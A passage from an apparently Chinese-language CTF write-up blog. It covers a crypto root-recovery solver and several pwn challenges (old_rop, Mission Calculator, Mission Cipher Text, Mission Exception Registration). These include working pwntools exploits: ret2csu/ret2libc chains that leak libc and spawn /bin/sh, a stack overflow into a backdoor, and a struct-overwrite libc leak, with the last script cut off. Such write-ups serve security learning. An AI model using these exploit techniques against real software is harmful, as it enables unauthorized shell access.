class="number">2</span></span><br><span class="line">    s += <span class="number">1</span></span><br><span class="line">t = tmp</span><br><span class="line"><span class="comment"># 按题设应有 s == 1</span></span><br><span class="line"><span class="keyword">assert</span> s == <span class="number">1</span>, <span class="string">f&quot;理论上应有 s=1，但现在 s=<span class="subst">&#123;s&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 第三步：计算 8 在模 t 下的逆元 a =====</span></span><br><span class="line"><span class="comment"># Python 3.8+ 支持 pow(8, -1, t) 直接求逆；如不支持可改用扩展欧几里得</span></span><br><span class="line">a = <span class="built_in">pow</span>(e, -<span class="number">1</span>, t)  <span class="comment"># a ≡ e^&#123;-1&#125; (mod t)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 第四步：求 8 次方根的两个候选 =====</span></span><br><span class="line">u = <span class="built_in">pow</span>(C, a, r)        <span class="comment"># 这是 m 的一个候选（或其相反数）</span></span><br><span class="line">cand1 = u % r</span><br><span class="line">cand2 = (-u) % r        <span class="comment"># 另一个候选</span></span><br><span class="line"></span><br><span class="line">candidates = [cand1, cand2]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 第五步：把候选转成字节并做可读性/格式判断 =====</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ints_to_clean_bytes</span>(<span class="params">x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    b = long_to_bytes(x)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">looks_like_flag</span>(<span class="params">bs: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="comment"># 宽松规则：基本可打印并含 &#x27;&#123;&#x27; 与 &#x27;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;&#123;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> bs <span class="keyword">or</span> <span class="string">b&#x27;&#125;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> bs:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="comment"># 要求多数字节可打印（控制符少于总长的 5%）</span></span><br><span class="line">    nonprint = <span class="built_in">sum</span>([<span class="number">1</span> <span class="keyword">for</span> ch <span class="keyword">in</span> bs <span class="keyword">if</span> ch &lt; <span class="number">0x20</span> <span class="keyword">or</span> ch &gt; <span class="number">0x7e</span>])</span><br><span class="line">    <span class="keyword">return</span> nonprint &lt;= <span class="built_in">max</span>(<span class="number">1</span>, <span class="built_in">len</span>(bs)//<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">decoded = []</span><br><span class="line"><span class="keyword">for</span> idx, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(candidates, <span class="number">1</span>):</span><br><span class="line">    b = ints_to_clean_bytes(c)</span><br><span class="line">    decoded.append((idx, c, b))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按启发式选择最像 flag 的那个</span></span><br><span class="line">best = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> decoded:</span><br><span class="line">    _, c, b = item</span><br><span class="line">    <span class="keyword">if</span> looks_like_flag(b):</span><br><span class="line">        best = item</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 如果两个都不满足启发式，就选较短的（通常就是正确的 m）</span></span><br><span class="line"><span class="keyword">if</span> best <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    best = <span class="built_in">min</span>(decoded, key=<span class="keyword">lambda</span> x: <span class="built_in">len</span>(x[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">idx, m_guess, m_bytes = best</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 第六步：可选的一致性验证（并不能区分 ±m，但能防止程序性错误）=====</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(m_guess, e, n) == C, <span class="string">&quot;一致性校验失败：pow(m,e,n) != C&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 输出结果 =====</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] r =&quot;</span>, r)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] 2-adic 分解：r-1 = 2^%d * %d (t 为奇数)&quot;</span> % (s, t))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] a = e^&#123;-1&#125; (mod t) =&quot;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] 候选 #1（十进制）:&quot;</span>, candidates[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] 候选 #2（十进制）:&quot;</span>, candidates[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] 选择的候选为 #%d&quot;</span> % idx)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] 以 bytes 展示：&quot;</span>, m_bytes)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 以 utf-8 尝试解码：&quot;</span>, m_bytes.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"><span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] utf-8 解码失败（这通常意味着另一个候选是正确的）&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="old-rop"><a href="#old-rop" class="headerlink" title="old_rop"></a>old_rop</h3><p>给出了libc.so.6和ld-linux-x86-64.so.2</p>
<p>先patchelf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter /home/xing/pwn/problems/ld-linux-x86-64.so.2 pwn</span><br><span class="line">patchelf --replace-needed libc.so.6 /home/xing/pwn/problems/libc.so.6 pwn</span><br><span class="line">可以用ldd -v ./pwn检查是否patch成功</span><br></pre></td></tr></table></figure>

<p>注意要给pwn，libc.so.6，ld-linux-x86-64.so.2三个文件都chmod +x才能正常运行</p>
<h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><p><code>sub_401156</code>：</p>
<ul>
<li>栈上缓冲区：<code>0x80</code> 字节</li>
<li><code>rbp</code>：<code>0x8</code> 字节</li>
<li>覆盖返回地址的偏移：<code>0x80 + 0x8 = 0x88</code> 字节</li>
</ul>
<p>因此，payload 前缀需要 <code>b&quot;A&quot; * 0x88</code> 来精确覆盖到返回地址。</p>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>由于导入表仅有 <code>read</code>、<code>write</code>、<code>__libc_start_main</code>，没有 <code>system</code>，故采用 ret2libc。</p>
<ul>
<li>阶段一：使用 ret2csu 构造 ROP 调用 <code>write(1, &amp;write@GOT, 8)</code>，泄露出 <code>write@libc</code> 的实际地址；随后 ROP 返回 <code>main</code>，以便再次进入 <code>read</code> 读取第二阶段 payload。</li>
<li>阶段二：根据泄露出的地址计算 libc 基址，进而定位 <code>system</code> 与字符串 <code>&quot;/bin/sh&quot;</code>；然后使用 libc 内部的 <code>pop rdi; ret</code> gadget 设置参数，直接执行 <code>system(&quot;/bin/sh&quot;)</code>。</li>
</ul>
<h4 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h4><ol>
<li>先返回到 <code>gadget2</code>，布置寄存器：</li>
</ol>
<ul>
<li><code>rbx = 0</code></li>
<li><code>rbp = 0</code>（避免进入循环）</li>
<li><code>r12 = 1</code>（将成为 <code>edi = 1</code>）</li>
<li><code>r13 = &amp;write@GOT</code>（将成为 <code>rsi</code>）</li>
<li><code>r14 = 8</code>（将成为 <code>rdx = 8</code>）</li>
<li><code>r15 = &amp;write@GOT</code>（<code>[r15 + rbx*8]</code> 指向 GOT 中的函数地址 &#x3D;&gt; 直接调用 <code>write@libc</code>）</li>
</ul>
<ol start="2">
<li>然后跳到 <code>gadget1</code> 执行真实调用；由于 <code>gadget1</code> 之后有一个 <code>add rsp, 8</code>，需要在 ROP 链中预留一个 8 字节占位（junk）。</li>
<li>最终让函数链收尾并 <code>ret</code> 回 <code>main = 0x40117b</code>，以便进行第二次 <code>read</code>。</li>
</ol>
<p>泄露的8字节即为 <code>write@libc</code> 实际地址：<code>write_leak</code>。</p>
<p>下面的exp.py中有一些地方要注意：</p>
<ul>
<li>因为此前已经patchelf，所以开局照常 <code>p = process(&#39;./pwn&#39;)</code> 即可</li>
<li>WRITE_PLT，WRITE_GOT采用 <code>elf.plt[&#39;write&#39;]</code>，<code>elf.got[&#39;write&#39;]</code> 这种形式导入，不是从IDA里直接看</li>
<li>MAIN函数地址是从IDA里直接找的</li>
<li>CSU两个gadget的地址也是IDA里直接找的，然后像CSU_G2从IDA里直接看和执行 <code>ROPgadget --binary pwn --only &quot;pop|ret&quot; | grep r15</code> 结果是一致的</li>
<li>ret2csu阶段跟之前看的几个例题有些区别，可能要根据具体情况调整</li>
<li>后面ret2libc是标准模板，构造payload要考虑栈对齐，但是ret2csu的payload貌似不需要栈对齐</li>
</ul>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;geek.ctfplus.cn&#x27;, 32611)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">WRITE_PLT = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">READ_PLT = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">MAIN = <span class="number">0x40117b</span></span><br><span class="line">WRITE_GOT = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">CSU_G1 = <span class="number">0x4012b0</span></span><br><span class="line">CSU_G2 = <span class="number">0x4012ca</span></span><br><span class="line">rop = ROP(elf)</span><br><span class="line">RET = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>]).address</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">136</span></span><br><span class="line">payload1 += p64(CSU_G2)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)</span><br><span class="line">payload1 += p64(<span class="number">1</span>)</span><br><span class="line">payload1 += p64(WRITE_GOT)</span><br><span class="line">payload1 += p64(<span class="number">8</span>)</span><br><span class="line">payload1 += p64(WRITE_GOT)</span><br><span class="line">payload1 += p64(CSU_G1)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload1 += p64(MAIN)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;please care about it !\x00\n&#x27;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">write_leak = u64(p.recvn(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Leaked write@libc: <span class="subst">&#123;<span class="built_in">hex</span>(write_leak)&#125;</span>&quot;</span>)</span><br><span class="line">libc_base = write_leak - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;please care about it !\x00\n&#x27;</span>)</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)) + libc_base</span><br><span class="line">pop_rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>]).address</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;libc_base = <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;system    = <span class="subst">&#123;<span class="built_in">hex</span>(system)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;/bin/sh   = <span class="subst">&#123;<span class="built_in">hex</span>(binsh)&#125;</span>&quot;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">136</span> + p64(RET)</span><br><span class="line">payload2 += p64(pop_rdi)</span><br><span class="line">payload2 += p64(binsh)</span><br><span class="line">payload2 += p64(system)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Mission-Calculator"><a href="#Mission-Calculator" class="headerlink" title="Mission Calculator"></a>Mission Calculator</h3><p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./calc&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;geek.ctfplus.cn&quot;</span>, <span class="number">30315</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Press any key to start...\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Round &quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">    question = p.recvuntil(<span class="string">b&#x27;=&#x27;</span>)</span><br><span class="line">    <span class="comment"># \nProblem 1: 1566 * 8151 = </span></span><br><span class="line">    question = question.split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    question = question.split(<span class="string">b&#x27;=&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    ans = <span class="built_in">str</span>(<span class="built_in">eval</span>(question)).encode()</span><br><span class="line">    <span class="comment"># print(ans)</span></span><br><span class="line">    p.sendline(ans)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Mission-Cipher-Text"><a href="#Mission-Cipher-Text" class="headerlink" title="Mission Cipher Text"></a>Mission Cipher Text</h3><p>漏洞点</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 0x40144a */</span> <span class="type">size_t</span> <span class="title function_">submit_feedback</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rbp-0x20]</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter your feedback:&quot;</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100u</span>);     <span class="comment">// 长度 256，超过 buf[32]</span></span><br><span class="line">  <span class="keyword">return</span> fwrite(<span class="string">&quot;...&quot;</span>, <span class="number">1</span>, <span class="number">0x29</span>, <span class="built_in">stderr</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用栈溢出覆盖返回地址为后门即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 0x4014ab */</span> <span class="type">int</span> <span class="title function_">b4ckd00r</span><span class="params">()</span> &#123; <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br></pre></td></tr></table></figure>

<p>发送payload时候要注意栈对齐，有两种方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rop = ROP(elf)</span><br><span class="line">RET = rop.find_gadget([&#x27;ret&#x27;]).address</span><br><span class="line">payload = b&#x27;A&#x27; * OFFSET + p64(RET) + p64(BACKDOOR)</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">payload = b&#x27;A&#x27; * OFFSET + p64(BACKDOOR+5)  # 试了5，6，8都行</span><br></pre></td></tr></table></figure>

<p>另外<code>submit_feedback</code> 里还 <code>close(1)</code> 关闭了 stdout，拿到shell后需要执行 <code>exec 1&gt;&amp;2</code>，把标准输出指到标准错误，这样 ls、cat 等输出就能显示</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;geek.ctfplus.cn&#x27;</span>, <span class="number">32105</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;choice &gt; &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Please enter your feedback:\n&#x27;</span>)</span><br><span class="line">OFFSET = <span class="number">32</span> + <span class="number">8</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">BACKDOOR = elf.symbols.get(<span class="string">&#x27;b4ckd00r&#x27;</span>, <span class="number">0x4014ab</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line">RET = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>]).address</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * OFFSET + p64(RET) + p64(BACKDOOR)</span><br><span class="line"><span class="comment"># payload = b&#x27;A&#x27; * OFFSET + p64(BACKDOOR+6)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Mission-Exception-Registration"><a href="#Mission-Exception-Registration" class="headerlink" title="Mission Exception Registration"></a>Mission Exception Registration</h3><p>跟old_rop一样先patchelf</p>
<p>漏洞点</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">input</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter your feedback:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Feedback submitted.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>问题是找不到gadget去泄露libc地址</p>
<p>注意到view_resources函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">view_resources</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  login();</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)ptr + <span class="number">12</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;WELCOME, USER.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> write(<span class="number">1</span>, &amp;ptr, <span class="number">8u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">      <span class="string">&quot;Recently, our researchers successfully captured and reproduced the matrix of human thought activity and used it as&quot;</span></span><br><span class="line">      <span class="string">&quot; a model to successfully create an independent personality matrix from scratch. This would be a great technologica&quot;</span></span><br><span class="line">      <span class="string">&quot;l advancement. However, the Scientific Ethics Committee believes that this may be unethical and is currently evalu&quot;</span></span><br><span class="line">      <span class="string">&quot;ating the risks of this technology.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;WELCOME, ADMINISTRATOR.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> write(<span class="number">1</span>, (<span class="type">char</span> *)ptr + <span class="number">56</span>, <span class="number">8u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它有两个分支</p>
<ul>
<li>普通用户分支（<code>*((DWORD*)ptr + 12) != 0</code>，注册后默认为 2）：<code>write(1, &amp;ptr, 8)</code>——直接把全局指针变量 <code>ptr</code> 的值原样输出（8 字节）。</li>
<li>管理员分支（<code>*((DWORD*)ptr + 12) == 0</code>）：<code>write(1, (char*)ptr + 56, 8)</code>——输出结构体偏移 56 处的 8 字节。<code>register_user()</code> 在收集完口令后会执行 <code>*((QWORD*)ptr + 7) = &amp;puts;</code>，即将 <code>&amp;puts</code> 写在该位置。因此管理员分支会直接泄露 <code>&amp;puts</code>。对函数指针的重定位通常解析为目标共享库中的真实地址（即 libc 内的 <code>puts</code> 实际地址），从而可以直接获得 <code>puts@libc</code>，进而计算 libc 基址。</li>
</ul>
<p>因此只要能以管理员身份登录即可泄露libc基址从而ret2libc。</p>
<p>看一下register_user函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">register_user</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)ptr + <span class="number">12</span>) != <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You have already registered.&quot;</span>);</span><br><span class="line">  *((_DWORD *)ptr + <span class="number">12</span>) = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, ptr, <span class="number">0x10u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter your password:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, (<span class="type">char</span> *)ptr + <span class="number">16</span>, <span class="number">0x28u</span>);</span><br><span class="line">  *((_DWORD *)ptr + <span class="number">13</span>) = <span class="number">1</span>;</span><br><span class="line">  *((_QWORD *)ptr + <span class="number">7</span>) = &amp;<span class="built_in">puts</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Registration successful.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>*((DWORD*)ptr + 12)</code> 是一个状态字段（偏移 48，4 字节），初值在 <code>user_init()</code> 中被设为 -1，注册后被设为 2。</p>
<p><code>register_user()</code> 的密码读取：<code>read(0, (char*)ptr + 16, 0x28)</code>，会覆盖结构 <code>[16, 16+0x28)</code>，即 <code>[16, 56)</code>。<br>状态字段位于偏移 48（4 字节），正好落在覆盖范围内。<br>因此可在注册时发送 40 字节密码，让第 32~35 个字节为 <code>\x00</code>，即可把偏移 48 处的 DWORD 清零。<br>例如：<code>pwd = b&#39;B&#39;*32 + b&#39;\x00&#39;*4 + b&#39;C&#39;*4</code>（总 40 字节）。<br>随后选择菜单 3 进入 <code>view_resources</code>，发送 32 字节（如 <code>b&#39;B&#39;*32</code> 或 <code>b&#39;B&#39;*31+b&#39;\x00&#39;</code>）即可进入管理员分支。</p>
<p>方便理解</p>
<ul>
<li>基址记为 ptr</li>
<li>偏移以十进制字节表示（括号内是十六进制）</li>
</ul>
<table>
<thead>
<tr>
<th>偏移范围</th>
<th>大小</th>
<th>含义&#x2F;用途</th>
<th>谁写入&#x2F;何时写入</th>
</tr>
</thead>
<tbody><tr>
<td>0..15 (0x00..0x0F)</td>
<td>16B</td>
<td>用户名 name 缓冲区</td>
<td>register_user: read(0, ptr, 0x10)</td>
</tr>
<tr>
<td>16..55 (0x10..0x37)</td>
<td>40B</td>
<td>密码 password 缓冲区</td>
<td>register_user: read(0, ptr+16, 0x28)</td>
</tr>
<tr>
<td>48..51 (0x30..0x33)</td>
<td>4B</td>
<td>状态字段 state &#x3D; <code>*((DWORD*)ptr+12)</code></td>
<td>user_init: -1; register_user: 2; 我们覆盖为 0</td>
</tr>
<tr>
<td>52..55 (0x34..0x37)</td>
<td>4B</td>
<td>另一标志位 &#x3D; <code>*((DWORD*)ptr+13)</code></td>
<td>user_init: 0; register_user: 1</td>
</tr>
<tr>
<td>56..63 (0x38..0x3F)</td>
<td>8B</td>
<td>函数指针槽 &#x3D; <code>*((QWORD*)ptr+7)</code></td>
<td>register_user: 写入 &amp;puts</td>
</tr>
</tbody></table>
<p>注意：</p>
<ul>
<li>“按 QWORD 索引”与“按字节偏移”等价：QWORD 索引 7 对应字节偏移 7×8&#x3D;56，所以 <code>*((QWORD*)ptr + 7)</code> 就是 <code>(char*)ptr + 56</code> 的那 8 字节。</li>
<li>密码的读取区间是 <code>[ptr+16, ptr+16+0x28) = [16,56)</code>，恰好覆盖到偏移 48-51 的状态位，但不包含偏移 56 的 puts 指针”，因此后续 <code>&amp;puts</code> 不会被我们密码覆盖。</li>
</ul>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 